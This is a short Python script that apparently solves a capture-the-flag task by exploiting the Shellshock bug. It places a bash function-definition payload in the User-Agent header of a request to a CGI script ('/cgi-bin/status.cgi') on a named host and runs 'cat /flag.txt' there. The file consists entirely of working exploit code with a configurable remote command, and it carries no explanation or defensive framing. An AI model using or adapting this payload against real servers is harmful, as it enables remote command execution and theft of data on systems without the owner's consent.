import requests

class client:
    def __init__(self) -> None:
        self.url = ""
        self.rce = ""
        self.port = 80
        self.cgibin = "/"
    def getHeader(self):
        return {"User-Agent":"() {{ :; }}; echo; echo; /bin/bash -c '{0}'".format(self.rce)}

    def __str__(self) -> str:
        return str(self.getHeader())

    def exploit(self):
        print(self.getHeader())
        return requests.get("{0}:{1}/{2}".format(self.url, self.port, self.cgibin), headers=self.getHeader()).text


victim = client()
victim.url = "http://www.dpp0900.com"
victim.port = 0
victim.rce = "cat /flag.txt"
victim.cgibin = "/cgi-bin/status.cgi"
print(victim.exploit())
